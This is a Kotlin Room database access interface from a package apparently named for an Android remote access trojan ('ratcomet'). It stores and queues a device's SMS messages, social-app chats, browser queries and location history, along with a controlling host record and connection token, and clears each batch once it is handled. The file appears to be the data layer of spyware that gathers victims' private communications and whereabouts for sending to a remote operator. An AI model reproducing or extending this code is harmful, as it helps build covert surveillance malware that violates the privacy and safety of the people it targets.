package ug.hix.ratcomet.database

import androidx.room.*
import ug.hix.ratcomet.model.*

@Dao
interface DatabaseDao {
    @Insert(entity = BrowserModel::class, onConflict = OnConflictStrategy.REPLACE)
    fun insertBrowserQuery(query: BrowserModel)

    @Insert(entity = SmsModel::class, onConflict = OnConflictStrategy.REPLACE)
    fun insertSms(sms: SmsModel)

    @Query("DELETE FROM browsermodel WHERE modified < :currentModified")
    fun deleteBrowserQuery(currentModified: String)

    @Delete(entity = SmsModel::class)
    fun deleteSms(sms: List<SmsModel>)

    @Insert(entity = SocialApp::class, onConflict = OnConflictStrategy.REPLACE)
    fun insertSocialMsg(msgs: List<SocialApp>)

    @Insert(entity = InitialConn::class, onConflict = OnConflictStrategy.REPLACE)
    fun insertInitialConn(info :InitialConn)

    @Query("SELECT * FROM initialconn")
    fun getInitialConn() : InitialConn?

    @Insert(entity = SocialAppS::class, onConflict = OnConflictStrategy.REPLACE)
    fun insertSocialSend(msgs: List<SocialApp>)

    @Delete(entity = SocialAppS::class)
    fun deleteSocialSend(msgs: List<SocialAppS>)

    @Query("SELECT * FROM socialapps")
    fun getSocialSend(): List<SocialAppS>

    @Query("SELECT * FROM socialapp WHERE contact = :contact  ORDER BY position DESC LIMIT 1")
    fun getLastMessage(contact: String) : SocialApp?

    @Query("SELECT * FROM socialapp WHERE contact = :contact  ORDER BY position ASC LIMIT 1")
    fun getFirstMessage(contact: String) : SocialApp?

    @Delete(entity = SocialApp::class)
    fun removeLastMessage(msg: SocialApp)

    @Insert(entity = LocationModel::class)
    fun insertLocation(loc: LocationModel)

    @Delete(entity = LocationModel::class)
    fun removeLocation(loc: List<LocationModel>)

    @Query("SELECT * FROM locationmodel")
    fun getLastKnownLocation() : List<LocationModel>

    @Query("SELECT * FROM smsmodel")
    fun getSmsList() : List<SmsModel>

    @Insert(entity = HostModel::class)
    fun insertHost(host: HostModel)

    @Query("SELECT * FROM hostmodel")
    fun getHost() : HostModel?

    @Query("UPDATE initialconn SET token_valid = 1")
    fun updateValidity()

    @Query("DELETE FROM smsmodel")
    fun clearAllSms()

    @Query("DELETE FROM locationmodel")
    fun clearAllLocations()

    @Query("DELETE FROM socialapps")
    fun clearAllSocialMsg()

}